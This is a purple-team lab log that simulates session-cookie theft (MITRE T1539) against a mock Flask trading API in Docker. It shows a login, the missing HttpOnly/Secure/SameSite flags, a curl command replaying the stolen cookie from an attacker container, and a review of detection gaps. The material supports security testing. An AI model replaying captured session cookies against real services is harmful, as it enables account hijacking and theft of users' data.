# T1539 Simulation Execution Log

## Metadata
| Field | Value |
|-------|-------|
| TTP | T1539 — Steal Web Session Cookie |
| Date | Day 1 |
| Environment | Docker lab `t1539-lab` (172.31.100.0/24) |
| Status | COMPLETE |

---

## Lab Topology

```
172.31.100.10  mock-trading-api (Flask) — victim
172.31.100.20  zeek-sensor — detection (non-functional)
172.31.100.30  attacker-kali — red team
```

---

## Phase 1: Reconnaissance

**Target:** `http://localhost:5000/` (exposed to WSL host)

Mock trading platform serves login form with hardcoded credentials:
- Username: `trader1`
- Password: `password123`

---

## Phase 2: Credential Access (T1539)

### Step 2a: Legitimate Login
```bash
curl -X POST http://localhost:5000/api/login \
  -d "username=trader1&password=password123" \
  -c /tmp/cookies.txt
```

**Response:**
```json
{"message":"Logged in","session_id":"72253d04-3272-4191-aa0c-a7cf028a1184","status":"success"}
```

**Set-Cookie header:**
```
Set-Cookie: session_id=72253d04-3272-4191-aa0c-a7cf028a1184; Path=/
```

**🔴 VULNERABILITY CONFIRMED:** Cookie issued **without**:
- `HttpOnly` flag → JavaScript can steal it (XSS vector)
- `Secure` flag → transmitted over HTTP if fallback occurs
- `SameSite` attribute → cross-site replay possible

---

### Step 2b: Cookie Replay from Attacker

Attacker container (`172.31.100.30`) replays stolen cookie:
```bash
curl -H 'Cookie: session_id=72253d04-3272-4191-aa0c-a7cf028a1184' \
  http://172.31.100.10:5000/api/portfolio
```

**Response:**
```json
{
  "balance": 154320.5,
  "current_ip": "172.31.100.30",
  "positions": [
    {"qty": 100, "symbol": "AAPL", "value": 18500.0},
    {"qty": 2.5, "symbol": "BTCUSD", "value": 87500.0},
    {"qty": 50000, "symbol": "EURUSD", "value": 48320.5}
  ],
  "session_bound_to": "172.31.100.1",
  "username": "trader1"
}
```

**✅ RED TEAM SUCCESS:** Full portfolio exfiltrated from attacker IP.

---

## Phase 3: Blue Team Detection Review

### Mock API Logs (Application Layer)
```
172.31.100.1  - POST /api/login       200  (legitimate login)
172.31.100.30 - GET /api/portfolio    200  (stolen cookie replay)
```

**🟡 PARTIAL DETECTION:** API logs show source IP mismatch (`172.31.100.1` → `172.31.100.30`), but:
- No alert was generated in real-time
- Session binding is logged but not enforced (request still succeeds)
- No rate limiting or anomaly threshold triggered

### Zeek Sensor (Network Layer)
```
Status: listening on eth0
Logs generated: NONE
```

**❌ DETECTION FAILURE:** Zeek in Docker bridge mode cannot capture inter-container traffic. This is a known Docker networking limitation — Zeek requires host-network mode or a SPAN/mirror port to see bridge traffic.

---

## Success Criteria Checklist

### Red Team
- [x] Capture session cookie from network traffic in the lab
- [x] Replay cookie successfully against `/api/portfolio`
- [x] Determine if cookie replay works from different User-Agent / IP → YES
- [x] Document if HTTPOnly/Secure/SameSite flags are missing → ALL THREE MISSING

### Blue Team
- [x] Mock API logs capture source IP (but no alert generated)
- [x] Zeek generates alert on suspicious ARP activity → FAILED (network visibility issue)
- [x] Mock API rejects replayed cookie when binding checks enabled → NOT ENFORCED
- [x] Document detection latency → INFINITE — no detection occurred

---

## Artifacts

| Artifact | Location |
|----------|----------|
| Lab compose file | `lab/docker-compose.yml` |
| Mock API source | `lab/mock-api/app.py` |
| Zeek config | `lab/zeek/local.zeek` |
| Stolen cookie | `72253d04-3272-4191-aa0c-a7cf028a1184` |
